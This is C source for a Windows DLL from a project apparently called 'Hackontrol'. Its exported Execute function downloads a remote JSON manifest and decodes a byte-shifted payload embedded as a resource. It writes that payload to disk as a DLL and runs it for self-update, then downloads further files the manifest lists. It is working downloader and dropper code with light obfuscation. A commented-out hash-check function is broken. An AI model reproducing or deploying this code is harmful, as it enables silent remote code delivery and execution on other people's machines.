#include <libkhopancurl.h>
#include <libhackontrol.h>
#include <libhackontrolcurl.h>
#include "execute.h"
#include "resource.h"

#include <openssl/sha.h>
#include <openssl/md5.h>

//#define HACKONTROL_OVERRIDE

#ifndef HACKONTROL_OVERRIDE
#ifdef _DEBUG
#define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
//#define HACKONTROL_NO_SELF_UPDATE
//#define HACKONTROL_NO_DOWNLOAD_FILE
#define HACKONTROL_NO_EXECUTE_FILE
#endif
#endif

static HINSTANCE instance;

BOOL WINAPI DllMain(HINSTANCE application, DWORD reason, LPVOID reserved) {
	instance = application;
	return TRUE;
}

static BOOL selfUpdate(const cJSON* const root) {
	cJSON* self = cJSON_GetObjectItem(root, "self");

	if(!self || !cJSON_IsObject(self)) {
		return FALSE;
	}

	cJSON* urlField = cJSON_GetObjectItem(self, "url");

	if(!urlField || !cJSON_IsString(urlField)) {
		return FALSE;
	}

	char* url = cJSON_GetStringValue(urlField);

	if(!url) {
		return FALSE;
	}

	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();

	if(!folderHackontrol) {
		return FALSE;
	}

	if(!HackontrolCreateDirectory(folderHackontrol)) {
		LocalFree(folderHackontrol);
		return FALSE;
	}

	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);

	if(!fileLibdll32) {
		LocalFree(folderHackontrol);
		return FALSE;
	}

	BOOL result = HashFileCheck(self, fileLibdll32);
	LocalFree(fileLibdll32);

	if(result) {
		LocalFree(folderHackontrol);
		return TRUE;
	}

	HRSRC handle = FindResourceW(instance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!handle) {
		LocalFree(folderHackontrol);
		return FALSE;
	}

	DWORD size = SizeofResource(instance, handle);

	if(!size) {
		LocalFree(folderHackontrol);
		return FALSE;
	}

	HGLOBAL resource = LoadResource(instance, handle);

	if(!resource) {
		LocalFree(folderHackontrol);
		return FALSE;
	}

	PBYTE data = LockResource(resource);

	if(!data) {
		LocalFree(folderHackontrol);
		return FALSE;
	}

	PBYTE buffer = LocalAlloc(LMEM_FIXED, size);

	if(!buffer) {
		LocalFree(folderHackontrol);
		return FALSE;
	}

	for(DWORD i = 0; i < size; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR fileLibupdate32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBUPDATE32, folderHackontrol);
	LocalFree(folderHackontrol);

	if(!fileLibupdate32) {
		LocalFree(buffer);
		return FALSE;
	}

	result = HackontrolWriteFile(fileLibupdate32, buffer, size);
	LocalFree(buffer);

	if(!result) {
		LocalFree(fileLibupdate32);
		return FALSE;
	}

	LPSTR argumentLibupdate32 = KHOPANFormatANSI("%lu %s", GetCurrentProcessId(), url);

	if(!argumentLibupdate32) {
		LocalFree(fileLibupdate32);
		return FALSE;
	}

	KHOPANExecuteDynamicLibrary(fileLibupdate32, FUNCTION_LIBUPDATE32, argumentLibupdate32);
	LocalFree(argumentLibupdate32);
	LocalFree(fileLibupdate32);
	return TRUE;
}

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	DWORD processIdentifier = 0;
	BOOL update = TRUE;
	PBYTE buffer;

	if(!argument || !strlen(argument)) {
		goto initializeGlobal;
	}

	buffer = KHOPANFormatMessage(L"%S", argument);

	if(!buffer) {
		goto initializeGlobal;
	}

	int count;
	LPWSTR* arguments = CommandLineToArgvW(buffer, &count);
	LocalFree(buffer);

	if(!arguments) {
		goto initializeGlobal;
	}

	if(count > 0) {
		processIdentifier = (DWORD) _wtoll(arguments[0]);
	}

	update = count > 1 && _wtoll(arguments[1]) ? FALSE : TRUE;
	LocalFree(arguments);
initializeGlobal:
	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		KHOPANERRORMESSAGE_CURL(code, L"curl_global_init");
		return;
	}

	cJSON* root = NULL;
	HANDLE handle;
	LARGE_INTEGER integer;
	DWORD read;
	DATASTREAM stream = {0};
#ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
	handle = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(!handle) {
		KHOPANLASTERRORMESSAGE_WIN32(L"CreateFileW");
		goto cleanupGlobal;
	}

	if(!GetFileSizeEx(handle, &integer)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"GetFileSizeEx");
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	buffer = LocalAlloc(LMEM_FIXED, integer.LowPart + 1);

	if(!buffer) {
		KHOPANLASTERRORMESSAGE_WIN32(L"LocalAlloc");
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	if(!ReadFile(handle, buffer, integer.LowPart, &read, NULL)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"ReadFile");
		LocalFree(buffer);
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	buffer[integer.LowPart] = 0;
	root = cJSON_Parse(buffer);
	LocalFree(buffer);
	CloseHandle(handle);
#else
	code = HackontrolDownload(URL_LATEST_FILE, &stream, TRUE, TRUE);

	if(code != CURLE_OK) {
		KHOPANERRORMESSAGE_CURL(code, L"HackontrolDownload");
		goto cleanupGlobal;
	}

	if(!KHOPANStreamAdd(&stream, "", 1)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"KHOPANStreamAdd");
		goto cleanupGlobal;
	}

	root = cJSON_Parse(stream.data);
	KHOPANStreamFree(&stream);
#endif
	if(!root) {
		MessageBoxW(NULL, L"Unable to parse JSON document", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto cleanupGlobal;
	}

	if(!cJSON_IsObject(root)) {
		KHOPANERRORMESSAGE_WIN32(ERROR_BAD_FORMAT, L"cJSON_IsObject");
		goto deleteJson;
	}
#ifndef HACKONTROL_NO_SELF_UPDATE
	if(update && selfUpdate(root)) {
		goto deleteJson;
	}
#endif
	if(processIdentifier && (handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIdentifier))) {
		WaitForSingleObject(handle, INFINITE);
		CloseHandle(handle);
	}
#ifndef HACKONTROL_NO_DOWNLOAD_FILE
	if(update) {
		ExecuteDownload(root);
	}
#endif
/*#ifndef HACKONTROL_NO_EXECUTE_FILE
	ProcessEntrypointsArray(rootObject);
#endif*/
#ifndef HACKONTROL_NO_SELF_UPDATE
deleteJson:
#endif
	cJSON_Delete(root);
cleanupGlobal:
	curl_global_cleanup();
}

/*BOOL HashFileCheck(const cJSON* const root, const LPCWSTR file) {
	HANDLE file = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	LARGE_INTEGER fileSize;
	BOOL match = FALSE;

	if(!GetFileSizeEx(file, &fileSize)) {
		goto closeHandle;
	}

	BYTE* buffer = LocalAlloc(LMEM_FIXED, fileSize.QuadPart);

	if(!buffer) {
		goto closeHandle;
	}

	DWORD bytesRead;

	if(!ReadFile(file, buffer, fileSize.LowPart, &bytesRead, NULL)) {
		goto freeBuffer;
	}

	if(fileSize.LowPart != bytesRead) {
		goto freeBuffer;
	}

	HASH("sha512", SHA512, SHA512_DIGEST_LENGTH);
	HASH("sha384", SHA384, SHA384_DIGEST_LENGTH);
	HASH("sha256", SHA256, SHA256_DIGEST_LENGTH);
	HASH("sha224", SHA224, SHA224_DIGEST_LENGTH);
	HASH("sha1", SHA1, SHA_DIGEST_LENGTH);
	HASH("md5", MD5, MD5_DIGEST_LENGTH);
freeBuffer:
	LocalFree(buffer);
closeHandle:
	CloseHandle(file);
	return match;
	return FALSE;
}*/
